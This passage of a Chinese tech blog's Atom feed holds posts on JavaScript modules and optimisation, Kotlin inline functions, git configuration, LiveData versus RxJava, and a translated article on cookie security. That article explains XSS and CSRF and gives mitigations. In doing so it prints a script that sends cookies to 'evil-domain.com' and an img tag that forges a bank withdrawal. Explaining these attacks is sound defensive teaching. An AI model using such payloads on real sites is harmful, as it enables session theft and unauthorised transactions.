class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react = <span class="built_in">require</span>(<span class="string">'react'</span>);</span><br><span class="line"><span class="comment">//通过_react.Component引用</span></span><br></pre></td></tr></table></figure><p>参考</p><ol><li><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">http://es6.ruanyifeng.com/#docs/module</a></li><li><a href="http://babeljs.io/repl/" target="_blank" rel="noopener">http://babeljs.io/repl/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JavaScript 在ES6之前没有给出官方模块的定义，因此社区自己搞了两个模块加载方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CommonJS (node)&lt;/li&gt;
&lt;li&gt;AMD (browser) 本文略&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 代码优化(译)</title>
    <link href="https://deskid.github.io/2017/11/27/JavaScript-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96/"/>
    <id>https://deskid.github.io/2017/11/27/JavaScript-代码优化/</id>
    <published>2017-11-27T15:47:14.000Z</published>
    <updated>2018-11-14T03:17:03.574Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://developers.google.com/speed/articles/optimizing-javascript" target="_blank" rel="noopener">https://developers.google.com/speed/articles/optimizing-javascript</a></p><p>作者: Gregory Baker, Software Engineer on GMail &amp; Erik Arvidsson, Software Engineer on Google Chrome</p><a id="more"></a><h3 id="不要在constructor中定义类方法-应该使用原型">不要在constructor中定义类方法，应该使用原型。</h3><p>下面的代码会在每次构造<code>baz.Bar</code>实例时，创建一个新的function实例；随着foo创建的同时还创建了一个闭包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baz.Bar = function() &#123;</span><br><span class="line">  // constructor body</span><br><span class="line">  this.foo = function() &#123;</span><br><span class="line">    // method body</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐下面的方式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baz.Bar = function() &#123;</span><br><span class="line">  // constructor body</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">baz.Bar.prototype.foo = function() &#123;</span><br><span class="line">  // method body</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>无论创建多少<code>baz.Bar</code>实例，只有一个<code>foo</code> function被创建，同时避免了闭包。</p><h3 id="在prototype上申明-初始化数值型的实例变量的初始值">在prototype上申明、初始化数值型的实例变量的初始值</h3><blockquote><p>数值型:比如:number, Boolean, null, undefined, or string<br>引用型:略</p></blockquote><p>避免了构造时，每次都调用无用的初始化代码。(与构造函数参数相关的实例变量除外)</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo.Bar = function() &#123;</span><br><span class="line">  this.prop1_ = 4;</span><br><span class="line">  this.prop2_ = true;</span><br><span class="line">  this.prop3_ = [];</span><br><span class="line">  this.prop4_ = &apos;blah&apos;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo.Bar = function() &#123;</span><br><span class="line">  this.prop3_ = [];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop1_ = 4;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop2_ = true;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop4_ = &apos;blah&apos;;</span><br></pre></td></tr></table></figure><!-- more --><h3 id="回避闭包带来的缺陷">回避闭包带来的缺陷</h3><p>闭包是JavaScript语言强大且有用的特性；然而同时也存在着许多缺陷：</p><ul><li>内存泄露是闭包最常见的缺点。</li><li>创建闭包比创建 <code>inner function</code> 更慢，而<code>inner function</code>又慢于<code>static function</code>。</li></ul><p>举例:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  var msg = &apos;Message to alert&apos;;</span><br><span class="line">  window.setTimeout(function() &#123; alert(msg); &#125;, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>慢于下面代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  window.setTimeout(function() &#123;</span><br><span class="line">    var msg = &apos;Message to alert&apos;;</span><br><span class="line">    alert(msg);</span><br><span class="line">  &#125;, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而上述代码又慢于下面代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function alertMsg() &#123;</span><br><span class="line">  var msg = &apos;Message to alert&apos;;</span><br><span class="line">  alert(msg);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  window.setTimeout(alertMsg, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>闭包增加了语义链的层级，浏览器在resolves属性时，每一层的语义链都会被检查 :</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a = &apos;a&apos;;</span><br><span class="line">    </span><br><span class="line">function createFunctionWithClosure() &#123;</span><br><span class="line">  var b = &apos;b&apos;;</span><br><span class="line">  return function () &#123;</span><br><span class="line">    var c = &apos;c&apos;;</span><br><span class="line">    a;</span><br><span class="line">    b;</span><br><span class="line">    c;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">var f = createFunctionWithClosure();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>当调用<code>f</code>时，referencing 效率：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &lt;  b &lt; c</span><br></pre></td></tr></table></figure><p>参考 <a href="http://blogs.msdn.com/ie/archive/2007/01/04/ie-jscript-performance-recommendations-part-3-javascript-code-inefficiencies.aspx" target="_blank" rel="noopener">IE+JScript Performance Recommendations Part 3: JavaScript Code inefficiencies</a>  了解 IE 下的闭包.</p><h3 id="避免使用-with">避免使用 <code>with</code></h3><p>避免使用 <code>with</code>，它不仅影响效率，还修改了scope chain，导致查找变量的开销变得更加昂贵。</p><h3 id="避免浏览器内存泄露">避免浏览器内存泄露</h3><p>内存泄露在 web 应用中太常见了，而且会引起严重的性能问题。<br>最常见的内存泄露是JavaScript引擎和浏览器C++ DOM对象(比如IE COM 基础组件，Firefox XPCOM 基础组件)循环引用</p><h4 id="use-an-event-system-for-attaching-event-handlers">Use an event system for attaching event handlers</h4><p>一种最常见的循环引用模式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ DOM element --&gt; event handler --&gt; closure scope --&gt; DOM element]</span><br></pre></td></tr></table></figure><p>参考 <a href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53028.aspx" target="_blank" rel="noopener">MSDN blog post</a>.</p><p>要想避免这种情况，可以使用 <a href="http://code.google.com/p/doctype/source/browse/trunk/goog/events/events.js#348" target="_blank" rel="noopener">Google doctype</a>, <a href="http://api.dojotoolkit.org/jsdoc/1.3/dojo.connec" target="_blank" rel="noopener">Dojo</a>, or <a href="http://docs.jquery.com/Events/bind#typedatafn" target="_blank" rel="noopener">JQuery</a>等成熟的事件处绑定库。</p><p>另外在 IE 中使用inline event handlers 会造成另外一种泄露，不同于普通的循环引用，泄露的是一种内部零时匿名script对象。</p><p>详情可参考 <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/ietechcol/dnwebgen/ie_leak_patterns.asp" target="_blank" rel="noopener">Understanding and Solving Internet Explorer Leak Patterns</a> “DOM Insertion Order Leak Model” 章节。<br>具体例子 <a href="http://www.javascriptkit.com/javatutors/closuresleak/index.shtml" target="_blank" rel="noopener">JavaScript Kit tutorial</a>.</p><h4 id="避免-expando-properties">避免 expando properties</h4><blockquote><p>Expando properties are properties added to DOM nodes with JavaScript, where those properties are not part of the object’s DOM specification:</p></blockquote><p>通过dot访问一个不存在的DOM属性时，javascript会自动创建一个Expando properties。<br>这种行为通常导致循环引用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ DOM element --&gt; via expando--&gt; intermediary object --&gt; DOM element ]</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// First set up the script scope to element reference</span></span><br><span class="line">  myGlobalObject =</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next set up the element to script scope reference</span></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>).expandoProperty =</span><br><span class="line">      myGlobalObject;</span><br></pre></td></tr></table></figure><p>最佳实践是不用使用。如果非要用这种特性不可，仅仅访问 primitive类型</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>];</span><br><span class="line">div.someProperty = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>或者将expando property置为null。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>).expandoProperty =</span><br><span class="line">               <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>参考  <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/ietechcol/dnwebgen/ie_leak_patterns.asp" target="_blank" rel="noopener">Understanding and Solving Internet Explorer Leak Patterns</a>&quot;Circular References&quot; 章节。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://developers.google.com/speed/articles/optimizing-javascript&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://developers.google.com/speed/articles/optimizing-javascript&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者: Gregory Baker, Software Engineer on GMail &amp;amp; Erik Arvidsson, Software Engineer on Google Chrome&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Cookies and security(译)</title>
    <link href="https://deskid.github.io/2017/11/26/cookies-and-security/"/>
    <id>https://deskid.github.io/2017/11/26/cookies-and-security/</id>
    <published>2017-11-26T05:24:21.000Z</published>
    <updated>2018-11-14T03:17:24.317Z</updated>
    
    <content type="html"><![CDATA[<p>Posted at May 12, 2009 by Nicholas C. Zakas<br><a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/" target="_blank" rel="noopener">原文</a></p><p>事实上关于cookie的安全策略有很多，cookie本身和安全相关的属性有 <code>domain</code>, <code>path</code>, and <code>secure</code>, 但是由于网页的天性使得cookie安全变得更加复杂。</p><a id="more"></a><h2 id="user-logins-and-session-hijacking">User logins and session hijacking</h2><p>cookie最常见的一种用途是跟踪login状态。</p><p>服务端在校验通过登录账号和密码后返回的cookie中记录了能标识当前用户的信息。同站的其他请求都会带上这个cookie来验证登陆状态。大多数站点都是使用的session cookie，在关闭浏览器后cookie就销毁了，也有一些提供了“remember me” 选项，比如提供一星期内不用重新登录的功能。</p><p>使用抓包攻击可以轻易的伪造用户身份，服务端无法分辨身份是否是伪造的。防止session hijacking有以下方法：</p><ol><li><p>上 https，使用 SSL 来传输cookie。</p></li><li><p>在session key中添加更多local或者随机信息，比如 ip，login time，使得伪造cookie更加困难。</p></li><li><p>对于关键操作，要求重新验证用户信息。比如支付、修改密码等等</p></li></ol><!-- more --><h2 id="third-party-cookies">Third-party cookies</h2><p>网页上往往会引用外部站点上的资源，比如css，script，iframe等。</p><p>在访问外部站点时，本域下的cookie不会被发送；同时，本域也无法访问外部站点返回的cookie</p><ul><li>Using a <code>&lt;link&gt;</code> tag to include a style sheet.</li><li>Using a <code>&lt;script&gt;</code> tag to include a JavaScript file.</li><li>Using an <code>&lt;object&gt;</code> or tag to include media files.</li><li>Using an <code>&lt;iframe&gt;</code> tag to include another HTML file.</li></ul><p>外部返回的cookie有啥用呢？</p><p>假设 Page A 访问了一个外部链接，第三方服务器返回一个记录了 <code>Referer</code> 的cookie，Page B 这时也访问该外部链接，这个cookie就会被发给第三方服务器，从而暴露了用户的访问记录。第三方服务器就知道了用户访问了Page A又访问了Page B，而仅仅根据这些信息就可以做一些广告推荐。</p><p>这些 cookies 被称为 tracking cookies。当然这些也不太可能会造成安全威胁，但是这个概念在更大规模的安全领域讨论中很重要。</p><h2 id="cookie-stealing-and-xss">Cookie stealing and XSS</h2><p>加载一个第三方域名下的JavaScript有巨大的安全隐患。 尽管在请求第三方 JavaScript 资源时不会发送本域名下的cookie，但是script还是可以读取到cookie。同一页面下的所有的JavaScript都被认为是运行在同一个domain、path、protocol下。这时访问<code>document.cookie</code>即可获取到cookie了。</p><p>举个例子说明：</p><p>页面A从第三方站点<code>evil-domain.com</code>加载了某个JavaScript，上线之后<code>evil-domain.com</code> 将该JavaScript改为如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br></pre></td></tr></table></figure><p>页面A下的cookie就这样被静默的发送给了<code>evil-domain.com</code>。</p><p>这种注入第三方的JavaScript的攻击方式也叫做XSS(cross-site scripting)攻击。</p><p>除了不小心include了一个可疑的script之外，XSS攻击还有可能是因为没有做输入过滤。</p><p>比如这个<a href="http://www.steve.org.uk/Hacks/XSS/simple.html" target="_blank" rel="noopener">网站</a>会将用户的的输入显示在网页上，当用户输入如下内容，cookie同样也会被盗取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>防止XSS：</p><ol><li>不要随便 include 来自可疑域名的 JavaScript；尽量选择大公司的CDN；</li><li>总是过滤或者sanitize用户的输入，不要直接输出用户的输入。</li></ol><p>HTTP-only cookies 是cookie标准的重要补充，script无法通过<code>document.cookie</code>读取被标记为 HTTP-only 的cookie。(注：目前所有的浏览器都实现了该标准)</p><h2 id="cross-site-request-forgery-csrf">Cross-site request forgery (CSRF)</h2><p>另外一种涉及到cookie的攻击是cross-site request forgery(CSRF)。这种攻击工作的原理是欺骗浏览器以用户的身份发送危险请求、例如转账、支付等。这种攻击常常利用XSS技术或者简单的HTML。</p><p>Wikipedia 展示了一个例子：</p><p>在一个没有过滤用户输入的论坛上，发布下面这样的一张图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure><p>如果你恰好登录了 <code>bank.example</code> 当你浏览这个帖子时就会发起一个转账请求。</p><p>和预防XSS一样，输入过滤也可以阻止CSRF攻击<br>其它的一些预防措施如下:</p><ul><li>对于敏感信息需要重新验证用户身份。</li><li>对于敏感系统，Cookies 的失效时间应尽可能的短。</li><li>不仅验证cookies，还要验证referer 或者 request type (POST instead of GET).</li></ul><p>由于CSRF攻击一旦触发很难排查，所以预防是关键。</p><h2 id="conclusion">Conclusion</h2><p>虽然列举了这么多关于cookie的安全攻击方式，但是，只要采取了合适的预防措施，使用cookie是安全的。</p><p>单单验证用户输入这个举措，就可以显著降低攻击数量，而且是一个低成本，高回报的预防措施，</p><p>最总要的是保持关注安全问题，紧跟最新技术防止攻击。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Posted at May 12, 2009 by Nicholas C. Zakas&lt;br&gt;
&lt;a href=&quot;https://www.nczonline.net/blog/2009/05/12/cookies-and-security/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;事实上关于cookie的安全策略有很多，cookie本身和安全相关的属性有 &lt;code&gt;domain&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, and &lt;code&gt;secure&lt;/code&gt;, 但是由于网页的天性使得cookie安全变得更加复杂。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="cookie" scheme="https://deskid.github.io/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(四)</title>
    <link href="https://deskid.github.io/2017/09/07/kotlin-learn-notes-4/"/>
    <id>https://deskid.github.io/2017/09/07/kotlin-learn-notes-4/</id>
    <published>2017-09-07T03:46:23.000Z</published>
    <updated>2018-11-14T03:18:19.802Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的<code>inline</code>关键字。</p><a id="more"></a><h3 id="inline">inline</h3><p>在kotlin中使用高阶方法确实很方便，但是这种便利是有代价的。我们知道 lambda 表达式其实就是一个 Function 对象。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun nonInlined(block: () -&gt; Unit) &#123;</span><br><span class="line">    println(&quot;before&quot;)</span><br><span class="line">    block()</span><br><span class="line">    println(&quot;after&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应Java代码为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void nonInlined(Function block) &#123;</span><br><span class="line">    System.out.println(&quot;before&quot;);</span><br><span class="line">    block.invoke();</span><br><span class="line">    System.out.println(&quot;after&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在kotlin中调用时</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nonInlined &#123;</span><br><span class="line">    println(&quot;do something here&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会被编译为下面的代码（简化）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nonInlined(new Function() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void invoke() &#123;</span><br><span class="line">        System.out.println(&quot;do something here&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里每次调用<code>nonInlined()</code>都会创建一个Function对象。如果这里调用的是非常通用的高阶函数，那么每次调用都会带来额外的内存、运行开销。</p><p><code>inline</code> 就是 kotlin 是用来优化这个问题的关键字。</p><!-- more --><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun inlined(block: () -&gt; Unit) &#123;</span><br><span class="line">    println(&quot;before&quot;)</span><br><span class="line">    block()</span><br><span class="line">    println(&quot;after&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用和之前一样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inlined &#123;</span><br><span class="line">    println(&quot;do something here&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应编译后的代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;before&quot;);</span><br><span class="line">System.out.println(&quot;do something here&quot;);</span><br><span class="line">System.out.println(&quot;after&quot;);</span><br></pre></td></tr></table></figure><p>使用inline可以增加运行效率，降低内存占用。相应的，带来的副作用就是代码膨胀。所以，inline 的最佳使用场景是一些短小的高阶函数，或者需要在循环中调用的函数。</p><p>在 kotlin std 库中定义的高阶函数基本上都是被inline 修饰的，我们自己在写库时也可以使用这个优化点。</p><p>但是，被inline的函数有一些副作用。</p><p>1、被inline的函数，无法在函数内部访问private变量、方法(除非用<code>internal</code>和<code>@PublishedApi</code>修饰)。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private val aPrivateMemberVariable = &quot;I&apos;m private&quot;</span><br><span class="line"></span><br><span class="line">@PublishedApi</span><br><span class="line">internal val anInternalMemberVariable = &quot;I&apos;m internal&quot;</span><br><span class="line"></span><br><span class="line">val aPublicMemberVariable = &quot;I&apos;m public&quot;</span><br><span class="line"></span><br><span class="line">inline fun higherOrderFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    //ERROR: can&apos;t access this variable in an inline function.</span><br><span class="line">    aPrivateMemberVariable.length</span><br><span class="line"></span><br><span class="line">    //Can access this variable because it&apos;s marked with @PublishedApi and internal</span><br><span class="line">    anInternalMemberVariable.length</span><br><span class="line"></span><br><span class="line">    //Can access this variable, it&apos;s public</span><br><span class="line">    aPublicMemberVariable.length</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、在被<code>inline</code>修饰的Function闭包内运行的lambda 中，可以使用 return 退出 calling 函数。</p><p>这种特性也被称为<code>non-local control flow</code>。<br>这样做其实是为了让我们可以在<code>forEach</code>中的lambda有能力控制循环。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun hasZeros(ints: List&lt;Int&gt;): Boolean &#123;</span><br><span class="line">    ints.forEach &#123;</span><br><span class="line">        if (it == 0) return true // returns from hasZeros</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，截止到1.1.4，kotlin 还不支持在<code>non-local control flow</code>中使用<code>break</code>和<code>continue</code>。😂</p><p>这个特性其实很容易产生bug，因为这样做的话，相当于剥夺了高阶函数对lambda运行的控制。比如在涉及资源处理时，乱用return很容易跳过了资源释放语句，而且不易调试。</p><p>而正常的lambda是没有能力return执行函数的，只能通过 <code>return@label</code> 的方式跳出 lambda自身。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun higherOrderFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    aLambda()</span><br><span class="line"></span><br><span class="line">    print(&quot;I won&apos;t be executed when you call callingFunction()&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun callingFunction() &#123;</span><br><span class="line"></span><br><span class="line">    higherOrderFunction &#123;</span><br><span class="line"></span><br><span class="line">        print(&quot;Non-local control flow&quot;)</span><br><span class="line"></span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了<code>inline</code>，kotlin中还有<code>noinline</code>、<code>crossinline</code>等关键字。</p><p><code>noinline</code>顾名思义，和<code>inline</code>含义相反。用于标记某个lambda，表示这个lambda在<code>inline</code> Function内不内联。</p><p><code>crossinline</code>用的比较少，主要用于在嵌套的Function内部使用lambda，被<code>crossinline</code>标记的lambda不能在lambda内部使用return。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun higherOrderFunction(crossinline aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    normalFunction &#123;</span><br><span class="line">        aLambda() //must mark aLambda as crossinline to use in this context.</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun normalFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line">  </span><br><span class="line">    return</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun callingFunction() &#123;</span><br><span class="line"></span><br><span class="line">    higherOrderFunction &#123; </span><br><span class="line"></span><br><span class="line">        return  //Error. Can&apos;t return from here.</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的&lt;code&gt;inline&lt;/code&gt;关键字。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>git多用户配置实践</title>
    <link href="https://deskid.github.io/2017/09/02/git%E5%A4%9A%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E5%AE%9E%E8%B7%B5/"/>
    <id>https://deskid.github.io/2017/09/02/git多用户配置实践/</id>
    <published>2017-09-02T15:46:23.000Z</published>
    <updated>2018-11-14T03:23:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要记录git多用户配置。</p><a id="more"></a><p>常见的使用场景是公司和github的用户配置不一样：</p><p>普通做法是为每个repo单独配置 User config</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --local user.name &quot;name&quot;</span><br><span class="line">git config --local user.email &quot;email&quot;</span><br></pre></td></tr></table></figure><p>repo多起来后再这样手动配置就有点麻烦了。考虑到公司和github的repo地址一个是gitlab，一个是github，所以有没有能根据repo地址自动配置git用户信息的方法呢？</p><!-- more --><h2 id="git-user-自动配置">git user 自动配置</h2><p>git 的User信息配置分两种，一种是<code>global</code>，一种是<code>local</code>。其中<code>local</code>配置信息存储在<code>./.git/config</code>文件中。</p><p>可以通过<code>hook</code>在每次commit之前判断repo地址来修改config，达到自动化的目的。</p><p>1、修改 <code>~/.gitconfig</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[init]</span><br><span class="line">templatedir = ~/.git/templates</span><br></pre></td></tr></table></figure><p>这会使得每个 git 目录在init时都会都会引用这个 templates 中的 配置。</p><p>2、新建 <code>~/.git/templates/hooks/pre_commit</code> 文件，在这个文件中的命令会在每次commit前执行。</p><script src="//gist.github.com/d025f48d4cc7e25b51e3c999c00c2a19.js"></script><p>3、<code>chmod +x ./pre_commit</code></p><p>然后在下次 commit 时会自动切换 user config 了，如果需要在已经初始化的 git 项目中使用这个 hook，重新运行 <code>git init</code> 即可。</p><h2 id="修改已提交的作者信息">修改已提交的作者信息</h2><p>有时候用了错误的User config提交了一条commit，怎样只修改User信息呢？</p><p>1、找到错误commit的上一个commit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase -i HASH</span><br></pre></td></tr></table></figure><p>如果要修改第一条commit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase -i --root</span><br></pre></td></tr></table></figure><p>2、使用 <code>edit</code> 修改该commit，保存退出后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stopped at c9441b4... init</span><br><span class="line">You can amend the commit now, with</span><br><span class="line">    </span><br><span class="line">git commit --amend</span><br><span class="line">    </span><br><span class="line">Once you are satisfied with your changes, run</span><br><span class="line">    </span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure><p>3、用 <code>--amend</code> 修改 author</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit --amend --author=&quot;user &lt;user@email.com&gt;&quot; --no-edit</span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure><p>4、强推到远程分支</p><h2 id="参考">参考</h2><ol><li><a href="http://stackoverflow.com/a/23107012/4422890" target="_blank" rel="noopener">http://stackoverflow.com/a/23107012/4422890</a></li><li><a href="https://www.git-tower.com/learn/git/faq/change-author-name-email" target="_blank" rel="noopener">https://www.git-tower.com/learn/git/faq/change-author-name-email</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要记录git多用户配置。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="https://deskid.github.io/categories/git/"/>
    
    
      <category term="git" scheme="https://deskid.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>LiveData VS RxJava</title>
    <link href="https://deskid.github.io/2017/08/07/LiveData-vs-Rxjava/"/>
    <id>https://deskid.github.io/2017/08/07/LiveData-vs-Rxjava/</id>
    <published>2017-08-07T04:13:23.000Z</published>
    <updated>2018-11-14T03:24:15.561Z</updated>
    
    <content type="html"><![CDATA[<p>本文比较了<code>LiveData</code>和<code>RxJava</code>在概念上的不同。</p><a id="more"></a><p>在看<code>LiveData</code>官方文档时，我第一反应是——这是一个自带生命周期的类似RxJava的轮子。<br><img src="/media/14985453596283.jpg" alt=""></p><p>我一开始把它看做RxJava来用，在使用一段时间后，LiveData总是让我觉得别扭。</p><p>问题就在于这两个概念实际上不太一样。</p><!-- more --><ol><li><p>LiveData 是一个 holder 而不是 steam。它存储的是最新一个value，当有观测者观测时总是会获得这个最新的数据。</p><blockquote><p>LiveData is essentially just like <code>BehaviorRelay</code>. It is a data holder that allows subscribers. But it also has an active/inactive state depending on number of current subscribers, so it’s kinda like <code>replay(1).publish().refCount()</code>. So, uh, <code>RxReplayingShare</code>.</p></blockquote></li><li><p>另外一个不一样的线程模型。RxJava提供了一套简洁的线程切换方法，而LiveData所有操作都运行于主线程。</p></li><li><p>LiveData 会根据LifecycleOwner，自动管理subscriber的生命周期，RxJava则不会。</p></li><li><p>LiveData 只提供了<code>Transformations.map</code>、<code>Transformations.switchMap</code>这两种操作符，远没有RxJava灵活。使用上也不支持链式调用。tips：可以使用Kotlin的扩展函数优化下</p> <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;X, Y&gt;</span> LiveData<span class="type">&lt;X&gt;</span>.<span class="title">map</span><span class="params">(transform: (<span class="type">x</span>: <span class="type">X</span>)</span></span> -&gt; Y): LiveData&lt;Y&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Transformations.map(<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span><span class="symbol">@map</span> transform(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;X, Y&gt;</span> LiveData<span 